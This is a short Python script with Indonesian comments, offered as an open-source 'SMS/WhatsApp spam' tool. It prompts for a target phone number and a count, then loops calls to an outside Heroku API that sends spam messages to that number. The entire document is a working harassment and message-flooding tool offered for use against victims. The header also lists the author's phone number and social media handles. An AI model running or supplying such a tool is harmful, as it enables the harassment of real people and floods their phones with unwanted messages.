# Sc Open Source Code Bebas Recode
# [ NOTE ] Kalau Mau Reccode Sertakan Nama Author
# Hargai Author
# Wa : +6285607036294
# Fb : Anam x Tdn
# ig : anam_tdn
# yt : Khoirul Anam

import requests, os

def logo():
  print("""
   ---------------------
   | Tool Spam Sms/Wa  |
   ---------------------
   =====================
   [ Author : Anam176  ]
   =====================
""")

def menu():
  os.system('clear')
  logo()
  print("\nMasukan Nomer Di Awali (8xxx)")
  nomor = input("Nomer Target : 0")
  jum = int(input("Jumlah : "))
  for i in range(jum):
      req = requests.get("https://ainxbot-sms.herokuapp.com/api/spamsms",params={"phone":nomor}).text
      if 'terkirim' in req:
           print("\nSpam Terkirim")
      else:
           print("\nSpam Gagal")
           os.system('clear')

menu()
